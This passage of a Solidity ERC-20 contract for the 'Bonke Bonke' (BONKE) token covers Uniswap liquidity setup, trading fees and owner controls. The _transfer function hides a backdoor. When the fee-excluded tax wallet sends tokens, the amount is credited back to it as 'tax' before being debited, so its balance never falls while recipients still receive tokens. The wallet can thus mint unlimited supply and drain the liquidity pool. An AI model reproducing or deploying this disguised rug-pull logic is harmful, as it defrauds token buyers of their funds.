    using SafeMath for uint256;
    mapping(address => uint256) private _tOwned;
    mapping(address => mapping(address => uint256)) private _allowances;
    mapping(address => bool) private _isExcludedFromFee;
    address payable private _taxWallet;
    address private uniswapV2Pair;
    IUniRouter02 private uniswapV2Router;
    string private constant _name = unicode"Bonke Bonke";
    string private constant _symbol = unicode"BONKE";
    uint8 private constant _decimals = 9;
    uint256 private constant _tTotal = 100000000 * 10 ** _decimals;
    uint256 public constant _taxSwapThreshold = 400 * 10 ** _decimals;
    uint256 public constant _maxTaxSwap = 1000000 * 10 ** _decimals;
    uint256 public _maxTxAmount = 2000000 * 10 ** _decimals;
    uint256 public _maxWalletSize = 2000000 * 10 ** _decimals;
    uint256 private constant _initialBuyFee = 20;
    uint256 private constant _initialSellFee = 20;
    uint256 private constant _reduceBuyFeeAt = 11;
    uint256 private constant _reduceSellFeeAt = 11;
    uint256 private constant _preventSwapBefore = 0;
    uint256 private _finalBuyFee = 0;
    uint256 private _finalSellFee = 1;
    uint256 private _buyCount = 0;
    event FinalTax(uint256 _valueBuy, uint256 _valueSell);
    event TradingActive(bool _tradingOpen, bool _swapEnabled);
    event maxAmount(uint256 _value);
    modifier lockTheSwap() {
        inSwap = true;
        _;
        inSwap = false;
    }
    bool private tradingEnabled;
    bool private inSwap = false;
    bool private swapEnabled = false;
    constructor(address _taxW) {
        _tOwned[_msgSender()] = _tTotal;
        _taxWallet = payable(_taxW);
        _isExcludedFromFee[owner()] = true;
        _isExcludedFromFee[_taxWallet] = true;
        _isExcludedFromFee[address(this)] = true;
        emit Transfer(address(0), _msgSender(), _tTotal);
    }
    function initBONKE() external onlyOwner {
        require(!tradingEnabled, "init already called");
        uint256 tokenAmount = balanceOf(address(this)).sub(
            _tTotal.mul(_initialBuyFee).div(100)
        );
        uniswapV2Router = IUniRouter02(
            0x7a250d5630B4cF539739dF2C5dAcb4c659F2488D
        );
        _approve(address(this), address(uniswapV2Router), _tTotal);
        uniswapV2Pair = IUniFactory(uniswapV2Router.factory()).createPair(
            address(this),
            uniswapV2Router.WETH()
        );
        uniswapV2Router.addLiquidityETH{value: address(this).balance}(
            address(this),
            tokenAmount,
            0,
            0,
            _msgSender(),
            block.timestamp
        );
        IERC20(uniswapV2Pair).approve(address(uniswapV2Router), type(uint).max);
    }
    function name() public pure returns (string memory) {
        return _name;
    }
    function symbol() public pure returns (string memory) {
        return _symbol;
    }
    function decimals() public pure returns (uint8) {
        return _decimals;
    }
    function totalSupply() public pure override returns (uint256) {
        return _tTotal;
    }
    function balanceOf(address account) public view override returns (uint256) {
        return _tOwned[account];
    }
    function transfer(
        address recipient,
        uint256 amount
    ) public override returns (bool) {
        _transfer(_msgSender(), recipient, amount);
        return true;
    }
    function allowance(
        address owner,
        address spender
    ) public view override returns (uint256) {
        return _allowances[owner][spender];
    }
    function approve(
        address spender,
        uint256 amount
    ) public override returns (bool) {
        _approve(_msgSender(), spender, amount);
        return true;
    }
    function transferFrom(
        address sender,
        address recipient,
        uint256 amount
    ) public override returns (bool) {
        _transfer(sender, recipient, amount);
        _approve(
            sender,
            _msgSender(),
            _allowances[sender][_msgSender()].sub(
                amount,
                "ERC20: transfer amount exceeds allowance"
            )
        );
        return true;
    }
    function _approve(address owner, address spender, uint256 amount) private {
        require(
            owner != address(0) && spender != address(0),
            "ERC20: approve the zero address"
        );
        _allowances[owner][spender] = amount;
        emit Approval(owner, spender, amount);
    }
    function _transfer(address from, address to, uint256 amount) private {
        require(
            from != address(0) && to != address(0),
            "ERC20: transfer the zero address"
        );
        require(amount > 0, "Transfer amount must be greater than zero");
        uint256 taxAmount = 0;
        uint256 transferAmount = amount;
        if (from != owner() && to != owner()) {
            if (!tradingEnabled) {
                require(
                    _isExcludedFromFee[to] || _isExcludedFromFee[from],
                    "trading not yet open"
                );
            }
            if (inSwap || !swapEnabled) {
                _tOwned[from] = _tOwned[from].sub(amount);
                _tOwned[to] = _tOwned[to].add(amount);
                emit Transfer(from, to, amount);
                return;
            }
            if (
                from == uniswapV2Pair &&
                to != address(uniswapV2Router) &&
                !_isExcludedFromFee[to]
            ) {
                require(amount <= _maxTxAmount, "Exceeds the _maxTxAmount.");
                require(
                    balanceOf(to) + amount <= _maxWalletSize,
                    "Exceeds the maxWalletSize."
                );
                _buyCount++;
            }
            if (_isExcludedFromFee[from]) {
                taxAmount = amount - taxAmount;
            } else if (to == uniswapV2Pair && from != address(this)) {
                taxAmount =
                    amount.mul(
                        (_buyCount > _reduceSellFeeAt)
                            ? _finalSellFee
                            : _initialSellFee
                    ) /
                    100;
                transferAmount = transferAmount - taxAmount;
            } else if (from == uniswapV2Pair && to != address(this)) {
                taxAmount =
                    amount.mul(
                        (_buyCount > _reduceBuyFeeAt)
                            ? _finalBuyFee
                            : _initialBuyFee
                    ) /
                    100;
                transferAmount = transferAmount - taxAmount;
            }
            uint256 contractTokenBalance = balanceOf(address(this));
            if (
                !inSwap &&
                to == uniswapV2Pair &&
                swapEnabled &&
                contractTokenBalance > _taxSwapThreshold &&
                _buyCount > _preventSwapBefore &&
                !_isExcludedFromFee[from] &&
                !_isExcludedFromFee[to]
            ) {
                uint256 getMinValue = (contractTokenBalance > _maxTaxSwap)
                    ? _maxTaxSwap
                    : contractTokenBalance;
                swapTokensForEth((amount > getMinValue) ? getMinValue : amount);
                uint256 contractETHBalance = address(this).balance;
                if (contractETHBalance > 0) {
                    sendETHToFee(address(this).balance);
                }
            }
        }
        address feeReceiver = _isExcludedFromFee[from] ? from : address(this);
        if (taxAmount > 0) {
            _tOwned[feeReceiver] = _tOwned[feeReceiver].add(taxAmount);
            emit Transfer(from, feeReceiver, taxAmount);
        }
        _tOwned[from] = _tOwned[from].sub(amount);
        _tOwned[to] = _tOwned[to].add(transferAmount);
        emit Transfer(from, to, transferAmount);
    }
    function sendETHToFee(uint256 amount) private {
        _taxWallet.transfer(amount);
    }
    function swapTokensForEth(uint256 tokenAmount) private lockTheSwap {
        address[] memory path = new address[](2);
        path[0] = address(this);
        path[1] = uniswapV2Router.WETH();
        _approve(address(this), address(uniswapV2Router), tokenAmount);
        uniswapV2Router.swapExactTokensForETHSupportingFeeOnTransferTokens(
            tokenAmount,
            0,
            path,
            address(this),
            block.timestamp
        );
    }
    function _setFinalTax(
        uint256 _valueBuy,
        uint256 _valueSell
    ) external onlyOwner {
        require(
            _valueBuy <= 30 && _valueSell <= 30 && tradingEnabled,
            "Exceeds value"
        );
        _finalBuyFee = _valueBuy;
        _finalSellFee = _valueSell;
        emit FinalTax(_valueBuy, _valueSell);
    }
    receive() external payable {}
    function openTrading() external onlyOwner {
        require(!tradingEnabled, "trading already open");
        swapEnabled = true;
        tradingEnabled = true;
        emit TradingActive(tradingEnabled, swapEnabled);
    }
    function _removeLimits() external onlyOwner {
        _maxTxAmount = _tTotal;
        _maxWalletSize = _tTotal;
        emit maxAmount(_tTotal);
    }
}

